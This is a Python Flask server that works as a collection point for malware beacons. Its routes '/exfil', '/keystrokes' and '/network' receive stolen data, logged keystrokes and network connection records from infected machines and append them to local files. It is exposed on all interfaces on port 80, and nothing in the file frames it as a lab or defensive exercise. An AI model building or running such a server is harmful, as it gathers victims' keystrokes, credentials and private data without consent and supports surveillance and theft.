from flask import Flask, request, jsonify
import os

app = Flask(__name__)

# Directory to store received data
if not os.path.exists("received_data"):
    os.makedirs("received_data")

# Route to receive data exfiltration beacon
@app.route('/exfil', methods=['POST'])
def receive_exfil():
    data = request.json
    if data:
        with open('received_data/exfil_data.txt', 'a') as f:
            f.write(f"{data}\n")
        return jsonify({"status": "success", "message": "Data received"}), 200
    return jsonify({"status": "failure", "message": "No data received"}), 400

# Route to receive keystroke beacon
@app.route('/keystrokes', methods=['POST'])
def receive_keystrokes():
    data = request.json
    if data and 'keystrokes' in data:
        with open('received_data/keystrokes.txt', 'a') as f:
            f.write(f"{data['keystrokes']}\n")
        return jsonify({"status": "success", "message": "Keystrokes received"}), 200
    return jsonify({"status": "failure", "message": "No keystrokes received"}), 400

# Route to receive network traffic beacon
@app.route('/network', methods=['POST'])
def receive_network():
    data = request.json
    if data and 'network_connections' in data:
        with open('received_data/network_data.txt', 'a') as f:
            f.write(f"{data['network_connections']}\n")
        return jsonify({"status": "success", "message": "Network data received"}), 200
    return jsonify({"status": "failure", "message": "No network data received"}), 400

if __name__ == "__main__":
    # Run the server on port 80 (HTTP) or port 443 (HTTPS)
    app.run(host='0.0.0.0', port=80)
